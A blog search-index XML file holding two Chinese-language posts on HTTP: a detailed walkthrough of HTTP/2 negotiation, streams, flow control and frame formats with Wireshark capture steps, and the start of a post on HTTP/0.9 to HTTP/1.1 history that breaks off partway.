<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>重新认识HTTP/2</title>
    <link href="/posts/33150/"/>
    <url>/posts/33150/</url>
    
    <content type="html"><![CDATA[<h1 id="重新认识http2">重新认识HTTP/2</h1><p>可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。<a href="https://lunaticsky-tql.github.io/posts/43947/">上一节</a>从HTTP的起源开始，重点深入探讨了HTTP/1.1新增特性的一些细节。本节将继续深入剖析HTTP/2的重要特性，并结合实践进行分析。</p><h2 id="总览">总览</h2><p>HTTP/1.1链接需要请求以正确的顺序发送，理论上可以用一些并行的链接（尤其是 5 到 8个），但是带来的成本和复杂性堪忧。比如，HTTP管线化（pipelining）就成为了 Web开发的负担。如下图的形式，浏览器同时建立了5个TCP连接，这样确实可以“并行”的获取资源，避免了前面提到的队头阻塞问题，但每一次TCP都要三次握手四次挥手，而且内存要同时为5个链接开辟缓冲区，未免有些太浪费计算和存储资源。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142651995802_532_image-20230828223930304.png" alt="image-20230828223930304" width="67%" height="67%"></p><p>为此，在 2010 年早期，谷歌通过实践了一个实验性的 SPDY协议。这种在客户端和服务器端交换数据的替代方案引起了在浏览器和服务器上工作的开发人员的兴趣。明确了响应数量的增加和解决复杂的数据传输，SPDY成为了 HTTP/2 协议的基础。</p><p>HTTP/2 在 HTTP/1.1 有几处基本的不同：</p><ul><li>HTTP/2是二进制协议而不是文本协议。不再可读，也不可无障碍的手动创建，改善的优化技术现在可被实施。</li><li>这是一个多路复用协议。并行的请求能在同一个链接中处理，移除了HTTP/1.x 中顺序和阻塞的约束。</li><li>压缩了标头。因为标头在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本。</li><li>其允许服务器在客户端缓存中填充数据，通过服务器推送的机制来提前请求。</li></ul><p>如果希望详尽的了解HTTP/2的细节，可以参见第一手资料<a href="https://www.rfc-editor.org/rfc/rfc7540#page-4">RFC7540</a>。同时有<a href="https://www.rfc-editor.org/rfc/rfc7541#page-4">RFC7541</a>。它主要单独讨论了HTTP/2 的头部压缩 (HPACK) 问题。</p><h2 id="实践基础">实践基础</h2><p>首先，现在的HTTP/2连接几乎都是 HTTP over TLS (即 HTTPS)的。关于HTTPS，后面会详细介绍。这意味着，我们无法像HTTP/1.x版本一样，若不启用HTTPS，是可以用wireshark抓到明文包的。</p><p>但是，我们也不是没有办法。毕竟我们从浏览器的F12中就能看到HTTP/2的一些信息的，浏览器知道怎么解密这些信息。是的，否则我们也无法看到想看到的页面。</p><p>具体来说，Chrome 或者 Firefox 都支持: 如果设置了环境变量<code>SSLKEYLOGFILE</code>, 就把 SSL/TLS的<code>pre-master  secret key</code>写到设置的文件里面去.之后可以使用这个<code>pre-master secret key</code> 文件在 wireshark里面解密加密的流量。</p><p>由于我使用的是mac，这里以mac为例讲解配置方法，Windows和linux同理。</p><p>1.设置 <code>SSLKEYLOGFILE</code> 环境变量 可以简单在命令行使用export 命令 (记得之后打开 Chrome 要在这个命令行)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v61ww6llvxiv1w"></i><span>shell</span><div class="collapse show" id="collapse-v61ww6llvxiv1w"><pre><code class="hljs shell">export SSLKEYLOGFILE=~/ssh_key.log</code></pre></div></div><p>2.在同一个命令行窗口打开 Chrome</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-49b91ollvxiv1w"></i><span>shell</span><div class="collapse show" id="collapse-49b91ollvxiv1w"><pre><code class="hljs shell">open /Applications/Google\ Chrome.app/</code></pre></div></div><p>3.在 Chrome 随便访问一个 https 的网站, 检查<code>~/ssh_key.log</code>是不是有内容</p><p>4.打开 wireshark 拦截流量或者 使用 tcpdump 有针对性的拦截</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6ftv22llvxiv1w"></i><span>shell</span><div class="collapse show" id="collapse-6ftv22llvxiv1w"><pre><code class="hljs shell">sudo tcpdump host 103.144.218.5 -w mydump.pcap</code></pre></div></div><p>5.打开 wireshark, 分析这个加密的流量. 显示设置SSL/TLS 的<code>pre-master secret key log</code> 文件:</p><p>菜单: preferences -&gt; Protocols -&gt; TLS</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142653033344_250_image-20230828224802757.png" alt="image-20230828224802757"><figcaption aria-hidden="true">image-20230828224802757</figcaption></figure><p>以我自己的电脑为例，在终端输入<code>ifconfig</code>，查看wifi对应网卡的ip地址，如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142654100695_258_image-20230829103603439.png" alt="image-20230829103603439"><figcaption aria-hidden="true">image-20230829103603439</figcaption></figure><h2 id="http2协商">HTTP2协商</h2><p>由于 HTTP不同版本协议之间的交互方式存在差异, 当客户端和服务端通信时,首先需要确定或称协商出所使用的 HTTP 协议版本,对于存在多版本的协议的通信双方在握手时几乎都需要有协商 (Negotiation)环节。</p><p>单纯的 HTTP 协议和 HTTP over TLS (即 https) 协议对于 HTTP/2的协商方式是不同的。在协议中以 h2 表示 HTTP over TLS, 以 h2c (c 是 clear的首字母, 代表 clear text, 与 https 的加密报文相区分) 表示单纯的 HTTP协议。二者的协商方式不同, 我们首先讨论 HTTP 的协商方式。</p><h3 id="http协商">HTTP协商</h3><p>在这种情况下，HTTP/2的协商方式和HTTP/1/1的协商方式是相同的。由于之前没有讲述HTTP/1.1的协商方式，在这里再进行讲解。</p><p>在没有任何先验知识的情况下, 客户端若想要和服务端以 HTTP/2协议进行通信, 那么客户端可以向服务端发送如下形式的 Request:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-03tu8illvxiv1w"></i><span>http</span><div class="collapse show" id="collapse-03tu8illvxiv1w"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>server.example.com<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade, HTTP2-Settings<span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>h2c<span class="hljs-attribute">HTTP2-Settings</span><span class="hljs-punctuation">: </span>&lt;base64url encoding of HTTP/2 SETTINGS payload&gt;</code></pre></div></div><p>客户端通过 <code>Upgrade</code>头部字段列出所希望升级到的协议和版本，多个协议之间用英文逗号和空格（0x2C,0x20）隔开。这里只有h2c。</p><p>如果服务端不同意升级或者不支持 <code>Upgrade</code>所列出的协议，直接忽略即可（当成 HTTP/1.1 请求，以 HTTP/1.1响应）；如果服务端同意升级，那么需要这样响应：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-a14x60llvxiv1w"></i><span>http</span><div class="collapse show" id="collapse-a14x60llvxiv1w"><pre><code class="hljs http">HTTPHTTP/1.1 101 Switching Protocols<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>upgrade<span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>h2c[... data defined by new protocol ...]</code></pre></div></div><p>可以看到，HTTP Upgrade 响应的状态码是<code>101</code>，并且响应正文可以使用新协议定义的数据格式。</p><p>同时注意到，客户端发的头部有一个<code>HTTP2-Settings</code>字段。这个与HTTP/1.1有所不同。<a href="https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/rfc7540">RFC7540</a> 要求进行 HTTP/2 协商的客户端在 Header 中必须包含且仅包含一个<code>HTTP2-Settings</code> 字段, 这个字段的值是 base64 编码的 HTTP/2SETTINGS frame (将在下面具体讨论), 用于客户端向服务端传递一些配置参数,若客户端在协商阶段发送的 Request 的 Header中没有包含这个字段或多于一个该字段, 则服务端不能 (MUST NOT) 升级为HTTP/2 协议。</p><h3 id="https协商">HTTPS协商</h3><p>由于 TLS 的拓展字段支持 ALPN (Application-Layer Protocol Negotiation,应用层协议协商), 即在进行 TLS 握手的同时本身可以通过 ALPN知晓对方使用的应用层协议是什么，因此通过 ALPN拓展字段已经协商好了双方使用的应用层协议, 因此当 TLS握手完成后便可以进行 HTTP/2 的通信交互了。</p><p>这一点怎么验证呢？ALPN拓展是在TLS的Say Hello阶段的。我们找到它：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142655503186_353_image-20230829105143660.png" alt="image-20230829105143660"><figcaption aria-hidden="true">image-20230829105143660</figcaption></figure><p>最后一行就是。</p><p>然后点开<code>Transmission Control Protocol</code>即TLS，然后找到<code>Handshake Protocol:Client Hello</code>，点开就可以看到一堆拓展。然后我们就能看到ALPN了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142656507459_485_image-20230829105347601.png" alt="image-20230829105347601"><figcaption aria-hidden="true">image-20230829105347601</figcaption></figure><p>分析得知，浏览器在进行SSL连接，第一次发送ClientHello包时，在扩展字段里携带浏览器支持的版本，其中 h2代表浏览器支持http2协议。</p><p>相应的，服务器在返回Server Hello包时，如果服务器支持http2，则会返回h2，如果不支持，则从客户端支持的协议列表中选取一个它支持的协议，一般为http/1.1。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142657588930_231_image-20230829105644589.png" alt="image-20230829105644589"><figcaption aria-hidden="true">image-20230829105644589</figcaption></figure><p>在 HTTP/2 协议中, 客户端和服务端都需要发送 Connection Preface，以便最终确认双方使用 HTTP/2 协议进行交互, 并且在 Connection Preface中可以对协议参数做一些初始化的工作。对于客户端来说, 当收到服务端 101状态码的响应 (通过 HTTP Upgrade 进行协议协商) 或 TLS 握手成功 (通过 TLSALPN 进行协议协商) 后, 便立即开始发送 Connection Preface。</p><p>Connection Preface 的开头是一个固定的字节序列(可以认为这是一个魔数,一般在设计网络协议时都会设置一个魔数以过滤掉不支持的数据),这个值用字符串表示为 <code>PRI *  HTTP/2.0\r\n\r\nSM\r\n\r\n</code>,在此序列后跟随发送一个可选的 SETTINGS frame,其中可以设置一些协议参数(将在下面讨论), 服务端的 Connection Preface不需要魔数, 但同样需要包含一个可选的 SETTINGS frame用于设置服务端的协议参数, 无论是客户端还是服务端, 当收到不合法的Connection Preface 都需要报告连接错误。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142658796661_863_image-20230829110305712.png" alt="image-20230829110305712"><figcaption aria-hidden="true">image-20230829110305712</figcaption></figure><h2 id="http2-stream">HTTP/2 Stream</h2><p>流(Stream) 是 HTTP/2 协议的核心, 因为在 HTTP/1.x 中,所有的请求都是在单个 TCP 连接上顺序发送的, HTTP/2 引入了 Stream 的概念,Stream 实际上是一个逻辑概念, 是虚拟的, 并非真实存在的对象。</p><p>一个 TCP 连接上可以同时存在多个 Stream, 这些 Stream可以并发地传输数据这些数据被称作帧(frame)。因此实际上, HTTP/2 Stream是对 TCP 连接的多路复用 (Multiplexing)。</p><p>在 frame 的结构中我们看到, frame header 中有 Stream Identifier 字段,用于指示该 frame 所属的 Stream 序号, 当一个 Stream Identifier 为 N 的frame 在 TCP 链路上传输时, 我们就可以认为它是在 Stream N 上传输. Stream需要由一方主动创建, <a href="https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/rfc6455">RFC7540</a> 要求<strong>由客户端初始化的 Stream, 其编号 (即 Identifier)必须是奇数, 而由服务端初始化的 Stream,其编号必须是偶数</strong>。特别地, 编号为 0 的 Stream 是用来传输整个(TCP) 连接的控制消息的。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142659977825_226_image-20230829112913643.png" alt="image-20230829112913643"><figcaption aria-hidden="true">image-20230829112913643</figcaption></figure><p>在 HTTP/2 中, 每一个新创建的 Stream 的编号必须比已有的所有的 Stream的编号都大, 当使用新编号的 Stream 时, 所有低于该编号的并且处于空闲(Idle) 状态的 Stream 都会被隐式的关闭, 在一个 TCP 链接中,流编号不能重复使用, 即新创建的 Stream编号不能是之前用过的编号(即便是之前用过的编号并且已关闭也不允许再使用),在 frame 中, 由于流编号只有 31 位, 因此对于一个 TCP 长连接来说,存在流编号被用光的情形, 当流编号用尽时, 如果需要再创建一个新的 Stream,对于客户端来说, 可以创建一个新的 TCP 连接, 对于服务端来说,可以向客户端发送一个 GOAWAY frame, 强制客户端打开新的一个 TCP 连接。</p><h3 id="流的生命周期">流的生命周期</h3><p>Flags 字段可以用来控制帧的状态。下图展示了一个流的生命周期。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142701018586_639_image-20230829115727462.png" alt="image-20230829115727462"><figcaption aria-hidden="true">image-20230829115727462</figcaption></figure><p>其中<code>PUSH_PROMISE</code>帧是一种特殊类型的帧，用于服务器推送资源给客户端。<strong>HTTP/2的推送机制</strong>允许服务器在响应一个客户端请求时，主动推送其他相关的资源给客户端，从而提前加载可能需要的资源，以改善页面加载性能和用户体验。</p><p>图中Reserved状态表示，在流上发送PUSH_PROMISE帧会将这个流留存供以后使用。具体的说当服务器向客户端发送PUSH_PROMISE帧，通知客户端它将会推送一个新的关联流（promisedstream），这个新流会被标记为<code>reserved (local)</code>状态。在接收到客户端的同意（或拒绝）之前，服务器会保留对该流的控制权。相应的，当客户端收到这个帧时候对于客户端来说这个新流就是<code>reserved (remote)</code>状态。</p><h3 id="流控制">流控制</h3><h4 id="流量控制">流量控制</h4><p>HTTP/2 在单个 TCP 连接上虚拟出多个 Stream, 多个 Stream 实现对一个 TCP连接的多路复用, 为了合理地利用传输链路,实现在有限资源内达到传输性能的最优化, 必须对 Stream 做一定的控制, HTTP/2本身只在逻辑层面规定了流控制的语义,具体的实现算法由协议的实现者自行决定, 类似于定义了一组抽象接口,具体的实现交由程序员去完成, HTTP/2 的流量控制有如下几个特点：</p><ul><li>HTTP/2 的流控制与 TCP 的流量控制有些类似, 但不完全相同, 双方发送WINDOW_UPDATE frame 以字节为单位来指示自身所接受的窗口大小,双方都必须遵守对方设置的窗口大小, <a href="https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/rfc6455">RFC7540</a> 规定的初始化窗口大小为 65535 个字节</li><li>只有 DATA frame 受流控制的约束, 对于其它类型的 frame 不受该规则限制,从而确保控制类的 frame 不会因流控约束而无法(及时)发送, 并且 HTTP/2的流控制双方都必须严格遵守, 流控制在 HTTP/2 中不能被关闭 (disable),当发送方不需要进行流控制时可以发送 WINDOW_UPDATE frame将窗口的值设置为最大值 , 但它仍然需要遵守对方设置的窗口限制。</li></ul><h4 id="优先级">优先级</h4><p>由于在一个 TCP 上存在多个 Stream, 而底层的传输层连接只有一个,为了更好地利用有限的资源, HTTP/2 对流引入了优先级的概念,引入优先级一方面向对方表达自身希望对方为该流分配资源的权重, 另一方面,对自身来说, 当资源有限时, 流的优先级可以用于决策优先发送哪个流上的frame, 可以通过标记一个流依赖于另一个流的完成来表征它的优先级,并且为依赖关系分配一个相对的权重, 举例来说, 若流 A 依赖于流 B, 则称流 A是流 B 的从属流 (dependent stream), 流 B 是流 A 的父级流 (parentstream), 一个流可以被任意个其它流所依赖, 例如流 B, C 可以同时依赖于流 A,它们都是流 A 的从属流, 可以用如下所示的图示来表示:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fx2hballvxiv1w"></i><span>text</span><div class="collapse show" id="collapse-fx2hballvxiv1w"><pre><code class="hljs text">  A                 A / \      ==&gt;      /|\B   C             B D C</code></pre></div></div><p>可以在创建流的时候通过 HEADERS frame (将在下面讨论)指示该流所依赖的流, 当流创建完成以后也可以通过 PRIORITY frame来改变流的优先级, 在设置流的依赖关系时, 可以在 frame header 中设置exclusive flag 来指示该流的排他性, 在上面的例子中, 我们看到流 B C同时依赖于 A, 若不设置 exclusive flag 我们可以继续创建流 D 使其与流 B C一样都在同一级依赖于流 A, 而若设置了 exclusive flag,那么流的层级依赖关系将如下所示:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1i4ek5llvxiv1w"></i><span>text</span><div class="collapse show" id="collapse-1i4ek5llvxiv1w"><pre><code class="hljs text">                    A  A                 | / \      ==&gt;       DB   C              / \                  B   C</code></pre></div></div><p>在这里例子中, 原先 B C 都依赖于流 A, 而创建流 D 时, 在 frame 中设置了exclusive flag, 这样以来只有流 D 直接依赖于流 A, 而原先的流 B C的父级流都将更改为流 D。</p><p>依赖的权重 (Weight) 用于决定流所能分配的资源(这个资源可能是多维度的,如为该流分配的内存等), 在 HTTP/2 中, 流的权重是一个 1~256 的整数,权重越大, 分配到的资源便越多, 举例来说, 假设流 B 和流 C 同时依赖于流 A,流 B 的依赖权重为 4, 流 C 的依赖权重为 12, 当流 A 的操作都完成以后或流 A处于阻塞状态暂时无法继续进行更多的操作, 在理想情况下, 流 B分配到的资源应是流 C 分配到的资源总量的 <span class="math inline">\(\frac{1}{3}\)</span>。</p><p>当然, 流的权重和优先级在 HTTP/2 中只是建议, 通信双方应该 (SHOULD)尽可能遵守这些规则, 但并不强制,通信的任何一方都不能强制要求对方必须按照流的优先级对流进行处理或严格按照权重比例进行资源分配,任何流都有依赖的流, 没有显示指明依赖流的流都依赖于编号为 0x0 的流。</p><p>比如，下面请求CDN上相关js和css文件。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142702230552_298_image-20230829141914005.png" alt="image-20230829141914005"><figcaption aria-hidden="true">image-20230829141914005</figcaption></figure><p>第一份javascript文件不指明依赖流，权重最高。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142705943679_812_image-20230829142038049.png" alt="image-20230829142038049"><figcaption aria-hidden="true">image-20230829142038049</figcaption></figure><p>后面几个流依次依赖前面的流。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142707262834_965_image-20230829142143613.png" alt="image-20230829142143613"><figcaption aria-hidden="true">image-20230829142143613</figcaption></figure><p>CSS文件流是js文件流的从属流，权重较低。</p><h2 id="http2-frame">HTTP/2 frame</h2><p>我们在计网课上学过，HTTP/2是使用二进制分帧传输的。在这里便对帧涉及到的细节进行讲述。</p><p>在 HTTP/2 中, frame 是客户端和服务端数据传输的最小单元, 当 HTTP/2Connection Preface 都发送校验完毕之后, 双方就可以正式开始以 frame的形式进行数据交换, frame 由 Header 和 Payload 两部分构成, 其中 Header(注意区分 frame 的 Header 和 HTTP 协议本身的 Header) 的长度固定为 9字节, Payload 的长度是可变的, frame 的结构<a href="https://datatracker.ietf.org/doc/html/rfc7540#page-12">如下所示</a>:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142708629121_799_image-20230829110616241.png" alt="image-20230829110616241"><figcaption aria-hidden="true">image-20230829110616241</figcaption></figure><ul><li>Length 字段长度为 3 字节, 以字节为单位指示 frame 的 Payload的长度(即该字段指示的长度不包含 9 字节的 frame header)</li><li>Type 字段长度为 1 字节, 指示 frame 的类型</li><li>Flags 字段长度为 1 字节, Flags 字段与 frame 的类型有关, 以 bit位来表征特定类型 frame 的特定设置</li><li>R 字段长度为 1 比特, 它是 Reserve 的首字母, 即该字段是保留字段,目前必须设置为 0</li><li>Stream Identifier 是 31 位的无符号整数, 它的值代表流编号, 当该字段非0 时, 表示当前帧属于某个特定的 Stream , 当其为 0 时, 代表该帧是属于整个TCP 连接的</li></ul><p>因为 Length 字段的长度为 3 字节, 所以在 HTTP/2 中, 一个 frame的最大长度为 <span class="math inline">\(2^{24}\)</span> 字节的 Payload+ 9 字节的 header, 在实际交互中, 客户端和服务端任何一方都可以通过SETTINGS frame 来设置自己所接受的 frame payload 的最大长度,这个长度的范围可以取<span class="math inline">\(2^{14}\)</span> 到 <span class="math inline">\(2^{24}-1\)</span> (以字节为单位)的区间内任意一个值, 当设置了该最大值时, 若在以后的通信中接收到的 frame的 payload 超过之前的设定, 则接收方应发送 FRAME_SIZE_ERROR 错误, 尽管在HTTP/2 中, frame payload 最大可以设置为 <span class="math inline">\(2^{24}-1\)</span> 个字节的大小, 但对于时延敏感的frame (如 RST_STREAM, 类似于 TCP 的 rst, 用于复位连接) 当 frame数据过大时传输效率低下, 将会影响整体的性能。</p><p>以下面这个<code>SETTING</code>帧为例。这是一个没有载荷的SETTING帧，是客户端向服务器发ACK。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142709689208_586_image-20230829111247968.png" alt="image-20230829111247968"><figcaption aria-hidden="true">image-20230829111247968</figcaption></figure><h3 id="data-frame">DATA frame</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142710882929_634_image-20230829123200882.png" alt="image-20230829123200882"><figcaption aria-hidden="true">image-20230829123200882</figcaption></figure><p>我们看到第一个字段是<code>Pad Length</code>。它是干什么的呢？frame可以选择性的传输 padding, padding 用于隐藏实际的 payload长度，以便达到<strong>隐私保护</strong>的目的。观察者可能通过观察数据包大小来推测出某些请求的内容。通过在帧中添加填充数据，可以使所有请求的数据包大小相似，从而增强用户数据的隐私保护。</p><p>当需要使用 padding 时, 需要在 frame header 中设置标志, padding的标志值为 <code>0x8</code>, 在设置标识时可以将所有标识位按位或,写到标识位对应的 offset 上, 它的标志值为<code>0x8</code>代表需要将标识字段的第四位二进制位设置成 1。</p><p>当设置了 padding 标识后, <code>Pad  length</code> 字段指示 padding的长度, 而 Padding 字段便是相应长度的数据, 这里的数据是没有任何语义的,需要都设置为 0, 接收方若收到设置了 padding 标识的 DATA frame, 并且它的padding 字段非 0 可以返回 <code>Connection Error</code>。若 Pad length指示的长度与实际的 Padding 长度不匹配, 则接收方应立即报告<code>Connection Error</code>。</p><p>以下面这个博客css文件的DATA帧为例，就没有padding。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142711803565_423_image-20230829123341595.png" alt="image-20230829123341595"><figcaption aria-hidden="true">image-20230829123341595</figcaption></figure><p>前面讲到了流的生命周期，DATA frame 只能在状态为 open 或 half-closed(remote) 状态的 Stream 上发送, 当接收方收到不属于这两种状态的 Stream 的DATA frame 时, 应立即报告 <code>STREAM_CLOSED</code> 的<code>Stream Error</code></p><h3 id="headers-frame">HEADERS frame</h3><p>HEADERS frame 用来初始化一个新的 Stream 或传输 HTTP/2 Header Block(将在下面讨论), Header frame 的 frame type 为 0x1, 它的 Payload 结构<a href="https://datatracker.ietf.org/doc/html/rfc7540#page-32">如下所示</a>:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP2/20230829142713340881_806_image-20230829114341902.png" alt="image-20230829114341902"><figcaption aria-hidden="true">image-20230829114341902</figcaption></figure><p><code>Pad Length</code>前面已经讲述过，不再赘述。</p><p><code>E</code>, 长度为 1 比特, 作为一个放在 Payload 中的标志位,用来指示是否开启 exclusive flag 。当且仅当在 frame 的 header 中设置了PRIORITY flag 时, 该字段有效。</p><p><code>Stream Dependency</code>, 长度为 31 比特,用来指示该流所依赖的流 。</p><p><code>Weight</code>, 长度为 1 字节,用于设置依赖的权重。值的有效范围为 1 ~ 256, 当且仅当在 frame 的 header中设置了 PRIORITY flag 时, 该字段有效。</p><p><code>Header Block  Fragment</code>是指头部块片段，它是用于在头部压缩上下文中传输HTTP头部信息的一部分。HTTP/2使用了HPACK压缩算法来减少头部信息的传输大小，从而提高传输效率。在头部信息较大时，可以将头部分成多个片段，每个片段被称为"HeaderBlockFragment"。头部压缩技术的细节还是有些复杂的，后面会专门拎出来讲。</p><p>简单的说，HTTP/2的头部压缩使用了静态表（StaticTable）和动态表（DynamicTable）来存储已经发送或接收的头部字段，以便更有效地传输这些字段。当发送或接收头部信息时，可以参考这些表来减少重复传输。如果头部信息太大，就可以将其分割成多个片段，在传输过程中逐个发送。</p><h2 id="总结">总结</h2><p>综上，这一部分的内容对HTTP/2的流机制和分帧传输方式进行了非常详尽的介绍。在其中也简单的介绍了服务器推送相关的内容。可以通过<a href="https://http2.akamai.com/demot">这个网站</a>体会HTTP/1.1和HTTP/2的性能差距，当然也可以对此进行抓包分析。这一部分尚未介绍的是头压缩机制。后面将会展开讲述。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重新认识HTTP/1.1</title>
    <link href="/posts/64429/"/>
    <url>/posts/64429/</url>
    
    <content type="html"><![CDATA[<h1 id="重新认识http1.1">重新认识HTTP/1.1</h1><p>可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。<a href="https://lunaticsky-tql.github.io/posts/31511/">上一部分</a>主要讲了HTTP最基本的东西，包括HTTP的结构，以及连接管理，状态保存和用户认证相关的知识。上述内容基本不脱离课程所学，属于是我们必须熟知的最最基本的东西。这一部分主要从HTTP的发展过程来进行HTTP的学习，标题也改成了“重新认识HTTP”。</p><h2 id="总览">总览</h2><p>HTTP是由Tim Berners-Lee 博士和他的团队在 1989-1991年间创造出它以来，三十多年来，HTTP已经发生了太多的变化，在保持协议简单性的同时，不断扩展其灵活性。如今，HTTP已经从一个只在实验室之间交换文件的早期协议进化到了可以传输图片，高分辨率视频和3D 效果的现代复杂互联网协议。<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Evolution_of_HTTP">这篇文章</a>简要的概括了HTTP的发展历史。同时下图也简要的概括了HTTP发展过程中发生的重大变化。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%B8%80/20230828222828497443_442_image-20230826164236772.png" alt="image-20230826164236772"><figcaption aria-hidden="true">image-20230826164236772</figcaption></figure><h2 id="http最初的样子">HTTP最初的样子</h2><p>最初版本的 HTTP 协议并没有版本号，后来它的版本号被定位在<code>0.9</code> 以区分后来的版本。<code>HTTP/0.9</code>极其简单：请求由单行指令构成，以唯一可用方法GET开头，其后跟目标资源的路径（一旦连接到服务器，协议、服务器、端口号这些都不是必须的）。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-shn8k8llvxiv1w"></i><span>http</span><div class="collapse show" id="collapse-shn8k8llvxiv1w"><pre><code class="hljs http">GET /mypage.html</code></pre></div></div><p>响应也极其简单的：只包含响应文档本身。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fbnyv3llvxiv1w"></i><span>html</span><div class="collapse show" id="collapse-fbnyv3llvxiv1w"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>  这是一个非常简单的 HTML 页面<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></div><p>跟后来的版本不同，<code>HTTP/0.9</code> 的响应内容并不包含 HTTP头。这意味着只有 HTML文件可以传送，无法传输其他类型的文件。也没有状态码或错误代码。一旦出现问题，一个特殊的包含问题描述信息的HTML 文件将被发回，供人们查看。</p><p>可以看出，这样简单的协议从一开始更像是局域网中获取资源的一种约定。</p><h2 id="http1.0">HTTP1.0</h2><p><code>HTTP/0.9</code>几乎没有什么可拓展性，而<code>HTTP/1.0</code>增加的这些特性，可以很明显的看出希望HTTP协议的用途更加广泛，并且便于后续进行拓展。</p><ul><li>协议版本信息现在会随着每个请求发送（<code>HTTP/1.0</code> 被追加到了<code>GET</code> 行）。</li><li>状态码会在响应开始时发送，使浏览器能了解请求执行成功或失败，并相应调整行为（如更新或使用本地缓存）。</li><li>引入了 HTTP标头的概念，无论是对于请求还是响应，允许传输元数据，使协议变得非常灵活，更具扩展性。</li><li>在新 HTTP 标头的帮助下，具备了传输除纯文本 HTML文件以外其他类型文档的能力（凭借<code>Content-Type</code> 标头）。</li></ul><h2 id="http1.1">HTTP1.1</h2><p><code>HTTP/1.1</code> 